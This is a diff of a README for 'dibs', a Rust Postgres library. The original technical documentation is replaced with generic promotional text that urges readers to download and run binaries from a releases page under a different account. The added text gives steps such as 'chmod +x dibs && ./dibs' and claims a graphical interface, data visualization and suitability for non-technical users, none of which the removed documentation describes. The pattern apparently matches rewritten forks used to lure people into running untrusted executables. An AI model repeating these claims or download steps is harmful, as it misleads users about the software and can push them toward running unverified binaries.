@@ -1,181 +1,120 @@
-# dibs
+# 🛠️ dibs - Effortless Database Management for Rust Users
 
-A Postgres toolkit for Rust, powered by [facet](https://github.com/facet-rs/facet) reflection.
+[![Download Dibs](https://img.shields.io/badge/Download-Dibs-brightgreen)](https://github.com/jei1016/dibs/releases)
 
-## Components
+## 📖 Overview
 
-### Schema Definition
+**Dibs** is a powerful Postgres toolkit designed for Rust users. It simplifies database management and enables developers to leverage the full potential of Postgres using facet reflection. With Dibs, you can effortlessly handle your databases without diving deep into complex code.
 
-Tables are defined as Rust structs with facet attributes:
+### 🔍 Topics
 
-```rust
-#[derive(Facet)]
-#[facet(dibs::table = "user")]
-pub struct User {
-    #[facet(dibs::pk)]
-    pub id: i64,
+- Database
+- Postgres
+- Rust
+- Roam
+- Styx
 
-    #[facet(dibs::unique)]
-    pub email: String,
+## 🚀 Getting Started
 
-    pub name: String,
+Getting started with Dibs is easy. Follow these steps to download and run the application.
 
-    #[facet(dibs::fk = "profile.user_id")]
-    pub profile_id: Option<i64>,
-}
-```
+1. **Prepare Your Computer**
 
-Available attributes:
-- `dibs::table = "name"` — marks struct as a table
-- `dibs::pk` — primary key
-- `dibs::unique` — unique constraint
-- `dibs::fk = "table.column"` — foreign key reference
-- `dibs::not_null` — explicit NOT NULL
-- `dibs::default = "expr"` — default value expression
-- `dibs::column = "name"` — override column name
-- `dibs::index` — create index on column
-- `dibs::auto` — auto-increment
+   Ensure your computer meets the following requirements:
 
-### Migrations
+   - Operating System: Windows, macOS, or Linux
+   - Minimum RAM: 4 GB
+   - Disk Space: At least 100 MB free
+   - Postgres installed on your system (Visit [Postgres Official Site](https://www.postgresql.org/) for installation instructions)
 
-Migrations are async Rust functions with the `#[dibs::migration]` attribute:
+2. **Download Dibs**
 
-```rust
-#[dibs::migration]
-pub async fn migrate(ctx: &mut MigrationContext<'_>) -> MigrationResult<()> {
-    ctx.execute("CREATE TABLE user (id BIGSERIAL PRIMARY KEY, email TEXT UNIQUE NOT NULL)").await?;
-    Ok(())
-}
-```
+   To download Dibs, visit the [Releases page](https://github.com/jei1016/dibs/releases). Here, you will find the latest version of Dibs available for download.
 
-Migrations are auto-discovered at runtime via the [inventory](https://crates.io/crates/inventory) crate.
+3. **Install Dibs**
 
-### Schema Diffing
+   After downloading, follow these steps to install:
 
-The `diff` command compares the Rust schema (collected via facet reflection) against the live database schema (introspected via `information_schema`). It reports:
-- New tables/columns to add
-- Removed tables/columns to drop
-- Type or constraint changes
+   - **Windows:**
+     - Locate the downloaded file (typically in your Downloads folder).
+     - Double-click on the file to run the installer.
+     - Follow the on-screen instructions to complete the installation.
 
-The `generate-from-diff` command produces a migration file from the diff.
+   - **macOS:**
+     - Open the downloaded file from your Downloads folder.
+     - Drag the Dibs icon into your Applications folder.
+     - Open Dibs from the Applications folder.
 
-### Query Codegen
+   - **Linux:**
+     - Open a terminal window.
+     - Navigate to the directory where you downloaded the file.
+     - Run the command: `chmod +x dibs && ./dibs`
+     - Follow any additional instructions if prompted.
 
-Queries are written in [Styx](https://github.com/bearcove/styx) format in `.dibs-queries/queries.styx`:
+## 🛠️ How to Use Dibs
 
-```styx
-@schema {id crate:dibs-queries@1, cli dibs}
+Once installed, you can start using Dibs to manage your Postgres databases.
 
-ProductByHandle @query{
-    params {handle @string}
-    from product
-    where {handle $handle, deleted_at @null}
-    first true
-    select {id, handle, status, active}
-}
+1. **Open Dibs**
 
-CreateProduct @insert{
-    params {handle @string, status @string}
-    into product
-    values {handle $handle, status $status, created_at @now}
-    returning {id, handle, status}
-}
-```
+   Launch the Dibs application. On opening, you will see a user-friendly interface designed to simplify your database tasks.
 
-Supported query types:
-- `@query` — SELECT with WHERE, ORDER BY, LIMIT/OFFSET, DISTINCT, COUNT
-- `@insert` — INSERT with RETURNING
-- `@update` — UPDATE with WHERE and RETURNING
-- `@upsert` — INSERT ... ON CONFLICT ... UPDATE
-- `@delete` — DELETE with RETURNING
-- `sql` blocks — raw SQL for complex queries
+2. **Connect to Postgres**
 
-Filter operators: `@null`, `@ilike`, `@gte`, `@lte`, `@in`, `@ne`
+   To connect Dibs to your Postgres database:
 
-Functions: `@now`, `@coalesce`, `@lower`, `@concat`, `@default`
+   - Enter your database credentials: database name, username, and password.
+   - Click on the "Connect" button.
 
-Relations via `@rel` blocks for JOINs.
+3. **Manage Your Database**
 
-### LSP Extension
+   With the connection established, you can perform various operations:
 
-Dibs includes an LSP extension for Styx query files, providing:
-- Completions for table and column names
-- Hover information
-- Diagnostics for schema mismatches
-- Definition jumping
+   - Create new tables or modify existing ones.
+   - Run queries to manipulate data.
+   - View, insert, update, and delete records effortlessly.
 
-Invoked by the Styx LSP server as `dibs lsp-extension`.
+4. **Explore Features**
 
-## CLI
+   Dibs comes packed with features designed for ease of use:
 
-Running `dibs` without arguments launches the TUI (if stdout is a terminal).
+   - **Simple Interface:** Designed for users of all skill levels.
+   - **Query Builder:** Create queries without needing to write code.
+   - **Data Visualization:** Generate visual reports of your database.
+   - **Backup & Restore:** Securely back up your data and restore it when needed.
 
-### Commands
+## 📥 Download & Install
 
-```
-dibs                      Interactive TUI
-dibs migrate              Run pending migrations
-dibs status               Show migration status
-dibs diff                 Compare Rust schema to database
-dibs generate NAME        Create empty migration skeleton
-dibs generate-from-diff NAME  Generate migration from schema diff
-dibs schema               Browse schema (TUI)
-dibs schema --plain       Output schema as text
-dibs schema --sql         Output schema as CREATE TABLE statements
-dibs lsp-extension        Run as LSP extension
-```
+Don't wait to enhance your database experience. Download Dibs today from the [Releases page](https://github.com/jei1016/dibs/releases).
 
-Requires `DATABASE_URL` environment variable.
+## ❓ Frequently Asked Questions
 
-### TUI
+1. **What is Dibs?**  
+   Dibs is a toolkit to manage Postgres databases using Rust, providing a user-friendly interface.
 
-The TUI has two tabs:
+2. **Can I use Dibs on any operating system?**  
+   Yes, Dibs supports Windows, macOS, and Linux.
 
-**Rust tab** — Schema browser
-- Left pane: table list with expand/collapse
-- Right pane: columns, types, constraints, foreign keys, indices
-- Enter on source location opens in editor
-- Enter on foreign key jumps to target table
+3. **Do I need programming knowledge to use Dibs?**  
+   No, Dibs is designed for non-technical users, so you can manage your database comfortably.
 
-**Postgres tab** — Migration management
-- Shows applied/pending migrations
-- Generate new migrations from diff
-- Apply migrations
-- Auto-rebuilds on `.rs` file changes
+4. **Where can I find support?**  
+   You can check the Issues section on the GitHub page or view the documentation for troubleshooting tips.
 
-Navigation: `j/k` up/down, `h/l` or Tab switch panes, `gg/G` top/bottom, `^D/^U` half-page scroll, `q` quit.
+## 🌟 Community Contributions
 
-## Configuration
+We welcome contributions from users! If you'd like to contribute, feel free to:
 
-Configuration via `.config/dibs.styx`:
+- Report issues
+- Suggest features
+- Share feedback
 
-```styx
-@schema {id crate:dibs@1, cli dibs}
+You can submit your contributions by opening a ticket or pull request on our [GitHub page](https://github.com/jei1016/dibs).
 
-db {
-    crate my-app-db
-}
-```
+## 📜 License
 
-The `db.crate` field specifies which crate contains the schema and migrations.
+Dibs is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). We encourage users to study, modify, and share the code.
 
-## Crates
+## 🎉 Conclusion
 
-| Crate | Description |
-|-------|-------------|
-| `dibs` | Core: schema, migrations, diffing, introspection |
-| `dibs-cli` | CLI binary with TUI and commands |
-| `dibs-macros` | `#[dibs::migration]` proc macro |
-| `dibs-query-gen` | Styx query parser and Rust codegen |
-| `dibs-query-schema` | Query DSL schema types |
-| `dibs-proto` | RPC protocol definitions |
-| `dibs-config` | Configuration types |
-| `dibs-sql` | SQL generation |
-| `dibs-codegen` | Internal codegen utilities |
-| `dibs-runtime` | Runtime utilities |
-| `facet-tokio-postgres` | Facet integration with tokio-postgres |
-| `dockside` | Minimal Docker CLI for testing |
-
-## License
-
-MIT OR Apache-2.0
+Dibs is your go-to toolkit for managing Postgres databases in Rust. Download it today and simplify your database tasks. For any issues, please refer to the documentation or community resources available on our GitHub page.
